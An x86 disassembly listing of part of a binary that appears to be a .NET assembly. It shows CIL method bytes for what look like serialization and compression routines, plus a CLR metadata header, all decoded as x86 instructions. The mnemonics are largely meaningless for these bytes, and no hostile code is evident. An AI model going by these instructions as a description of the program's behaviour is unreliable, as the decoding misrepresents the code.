  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	c4 1d 00 00 23 53    	les    0x53230000,%ebx
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 ec                	add    %ch,%ah
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 dc                	add    %bl,%ah
  405a39:	27                   	daa
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 c8                	add    %cl,%al
  405a41:	63 00                	arpl   %eax,(%eax)
  405a43:	00 10                	add    %dl,(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 d8                	add    %bl,%al
  405a51:	63 00                	arpl   %eax,(%eax)
  405a53:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  405a56:	00 00                	add    %al,(%eax)
  405a58:	23 42 6c             	and    0x6c(%edx),%eax
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	ea 0a 01 00 00 00 00 	ljmp   $0x0,$0x10a
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 39                	add    %bh,(%ecx)
  405ae5:	19 ee                	sbb    %ebp,%esi
  405ae7:	0f 0a                	(bad)
  405ae9:	00 8a 00 03 16 0a    	add    %cl,0xa160300(%edx)
  405aef:	00 9f 19 72 18 0a    	add    %bl,0xa187219(%edi)
  405af5:	00 89 0f 91 1d 06    	add    %cl,0x61d910f(%ecx)
  405afb:	00 29                	add    %ch,(%ecx)
  405afd:	14 98                	adc    $0x98,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 7d 08             	add    %bh,0x8(%ebp)
  405b04:	03 16                	add    (%esi),%edx
  405b06:	0a 00                	or     (%eax),%al
  405b08:	a2 10 03 16 0a       	mov    %al,0xa160310
  405b0d:	00 0e                	add    %cl,(%esi)
  405b0f:	18 91 1d 06 00 f9    	sbb    %dl,-0x6fff9e3(%ecx)
  405b15:	19 ee                	sbb    %ebp,%esi
  405b17:	0f 0e                	femms
  405b19:	00 05 12 ef 0b 0e    	add    %al,0xe0bef12
  405b1f:	00 c4                	add    %al,%ah
  405b21:	18 ef                	sbb    %ch,%bh
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 4a 1c             	add    %cl,0x1c(%edx)
  405b28:	98                   	cwtl
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 29                	add    %ch,(%ecx)
  405b2d:	13 eb                	adc    %ebx,%ebp
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 5f 10             	add    %bl,0x10(%edi)
  405b34:	ee                   	out    %al,(%dx)
  405b35:	0f 0a                	(bad)
  405b37:	00 1a                	add    %bl,(%edx)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c1                	add    %al,%cl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 9b 15 12 00 01    	add    %bl,0x1001215(%ebx)
  405b4b:	00 ee                	add    %ch,%dh
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	d9 08                	(bad) (%eax)
  405b52:	9b                   	fwait
  405b53:	15 06 00 f8 07       	adc    $0x7f80006,%eax
  405b58:	ee                   	out    %al,(%dx)
  405b59:	0f 06                	clts
  405b5b:	00 e2                	add    %ah,%dl
  405b5d:	0b eb                	or     %ebx,%ebp
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a3 14 c8 17 06    	add    %ah,0x617c814(%ebx)
  405b67:	00 9c 05 c8 17 06 00 	add    %bl,0x617c8(%ebp,%eax,1)
  405b6e:	c2 0f 5c             	ret    $0x5c0f
  405b71:	02 06                	add    (%esi),%al
  405b73:	00 e6                	add    %ah,%dh
  405b75:	09 9b 15 06 00 53    	or     %ebx,0x53000615(%ebx)
  405b7b:	0a 9b 15 06 00 03    	or     0x3000615(%ebx),%bl
  405b81:	09 3d 15 6f 00 bb    	or     %edi,0xbb006f15
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	2b 09                	sub    (%ecx),%ecx
  405b8e:	4f                   	dec    %edi
  405b8f:	11 06                	adc    %eax,(%esi)
  405b91:	00 b2 09 4f 11 06    	add    %dh,0x6114f09(%edx)
  405b97:	00 93 09 4f 11 06    	add    %dl,0x6114f09(%ebx)
  405b9d:	00 3a                	add    %bh,(%edx)
  405b9f:	0a 4f 11             	or     0x11(%edi),%cl
  405ba2:	06                   	push   %es
  405ba3:	00 06                	add    %al,(%esi)
  405ba5:	0a 4f 11             	or     0x11(%edi),%cl
  405ba8:	06                   	push   %es
  405ba9:	00 1f                	add    %bl,(%edi)
  405bab:	0a 4f 11             	or     0x11(%edi),%cl
  405bae:	06                   	push   %es
  405baf:	00 42 09             	add    %al,0x9(%edx)
  405bb2:	4f                   	dec    %edi
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 76 09             	add    %dh,0x9(%esi)
  405bb8:	4f                   	dec    %edi
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 5d 09             	add    %bl,0x9(%ebp)
  405bbe:	06                   	push   %es
  405bbf:	0c 06                	or     $0x6,%al
  405bc1:	00 17                	add    %dl,(%edi)
  405bc3:	09 7c 15 06          	or     %edi,0x6(%ebp,%edx,1)
  405bc7:	00 e8                	add    %ch,%al
  405bc9:	08 9b 15 06 00 cf    	or     %bl,-0x30fff9eb(%ebx)
  405bcf:	09 4f 11             	or     %ecx,0x11(%edi)
  405bd2:	06                   	push   %es
  405bd3:	00 11                	add    %dl,(%ecx)
  405bd5:	03 98 0b 06 00 a5    	add    -0x5afff9f5(%eax),%ebx
  405bdb:	1b ee                	sbb    %esi,%ebp
  405bdd:	0f 06                	clts
  405bdf:	00 9d 1a ee 0f 06    	add    %bl,0x60fee1a(%ebp)
  405be5:	00 e6                	add    %ah,%dh
  405be7:	0b eb                	or     %ebx,%ebp
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 d6                	add    %dl,%dh
  405bed:	1c 03                	sbb    $0x3,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 19                	add    %bl,(%ecx)
  405bf3:	10 04 1d 06 00 f7 12 	adc    %al,0x12f70006(,%ebx,1)
  405bfa:	04 1d                	add    $0x1d,%al
  405bfc:	06                   	push   %es
  405bfd:	00 79 0b             	add    %bh,0xb(%ecx)
  405c00:	04 1d                	add    $0x1d,%al
  405c02:	06                   	push   %es
  405c03:	00 f3                	add    %dh,%bl
  405c05:	11 ee                	adc    %ebp,%esi
  405c07:	0f 0a                	(bad)
  405c09:	00 54 18 5e          	add    %dl,0x5e(%eax,%ebx,1)
  405c0d:	19 0a                	sbb    %ecx,(%edx)
  405c0f:	00 17                	add    %dl,(%edi)
  405c11:	1a 5e 19             	sbb    0x19(%esi),%bl
  405c14:	0a 00                	or     (%eax),%al
  405c16:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c17:	0e                   	push   %cs
  405c18:	5e                   	pop    %esi
  405c19:	19 0a                	sbb    %ecx,(%edx)
  405c1b:	00 2a                	add    %ch,(%edx)
  405c1d:	1d 72 18 0a 00       	sbb    $0xa1872,%eax
  405c22:	2d 08 72 18 0a       	sub    $0xa187208,%eax
  405c27:	00 18                	add    %bl,(%eax)
  405c29:	08 72 18             	or     %dh,0x18(%edx)
  405c2c:	06                   	push   %es
  405c2d:	00 c3                	add    %al,%bl
  405c2f:	0c ee                	or     $0xee,%al
  405c31:	0f 06                	clts
  405c33:	00 cc                	add    %cl,%ah
  405c35:	12 ee                	adc    %dh,%ch
  405c37:	0f 06                	clts
  405c39:	00 40 10             	add    %al,0x10(%eax)
  405c3c:	ee                   	out    %al,(%dx)
  405c3d:	0f 0a                	(bad)
  405c3f:	00 bb 17 5e 19 0a    	add    %bh,0xa195e17(%ebx)
  405c45:	00 55 17             	add    %dl,0x17(%ebp)
  405c48:	5e                   	pop    %esi
  405c49:	19 06                	sbb    %eax,(%esi)
  405c4b:	00 db                	add    %bl,%bl
  405c4d:	17                   	pop    %ss
  405c4e:	ee                   	out    %al,(%dx)
  405c4f:	0f 06                	clts
  405c51:	00 a8 05 ee 0f 0a    	add    %ch,0xa0fee05(%eax)
  405c57:	00 7b 0f             	add    %bh,0xf(%ebx)
  405c5a:	72 18                	jb     0x405c74
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	f0 0d 91 1d 0a 00    	lock or $0xa1d91,%eax
  405c64:	44                   	inc    %esp
  405c65:	1b 5e 19             	sbb    0x19(%esi),%ebx
  405c68:	0a 00                	or     (%eax),%al
  405c6a:	61                   	popa
  405c6b:	11 03                	adc    %eax,(%ebx)
  405c6d:	16                   	push   %ss
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	79 17                	jns    0x405c89
  405c72:	30 11                	xor    %dl,(%ecx)
  405c74:	06                   	push   %es
  405c75:	00 93 0a ee 0f 06    	add    %dl,0x60fee0a(%ebx)
  405c7b:	00 14 0e             	add    %dl,(%esi,%ecx,1)
  405c7e:	98                   	cwtl
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e2                	add    %ah,%dl
  405c83:	0d ee 0f 0a 00       	or     $0xa0fee,%eax
  405c88:	9f                   	lahf
  405c89:	0d ee 0f 0a 00       	or     $0xa0fee,%eax
  405c8e:	e4 07                	in     $0x7,%al
  405c90:	ee                   	out    %al,(%dx)
  405c91:	0f 06                	clts
  405c93:	00 88 14 ee 0f 06    	add    %cl,0x60fee14(%eax)
  405c99:	00 8c 1b 98 0b 06 00 	add    %cl,0x60b98(%ebx,%ebx,1)
  405ca0:	bc 0f 5c 02 06       	mov    $0x6025c0f,%esp
  405ca5:	00 0e                	add    %cl,(%esi)
  405ca7:	15 98 0b 0a 00       	adc    $0xa0b98,%eax
  405cac:	52                   	push   %edx
  405cad:	05 72 18 06 00       	add    $0x61872,%eax
  405cb2:	b8 01 ee 0f 06       	mov    $0x60fee01,%eax
  405cb7:	00 1d 12 5c 02 0a    	add    %bl,0xa025c12
  405cbd:	00 4c 18 3d          	add    %cl,0x3d(%eax,%ebx,1)
  405cc1:	15 0a 00 5f 12       	adc    $0x125f000a,%eax
  405cc6:	3d 15 06 00 f3       	cmp    $0xf3000615,%eax
  405ccb:	1c 55                	sbb    $0x55,%al
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 6a 14             	add    %ch,0x14(%edx)
  405cd2:	5c                   	pop    %esp
  405cd3:	02 06                	add    (%esi),%al
  405cd5:	00 62 0d             	add    %ah,0xd(%edx)
  405cd8:	5c                   	pop    %esp
  405cd9:	02 0a                	add    (%edx),%cl
  405cdb:	00 b1 06 3d 15 06    	add    %dh,0x6153d06(%ecx)
  405ce1:	00 30                	add    %dh,(%eax)
  405ce3:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
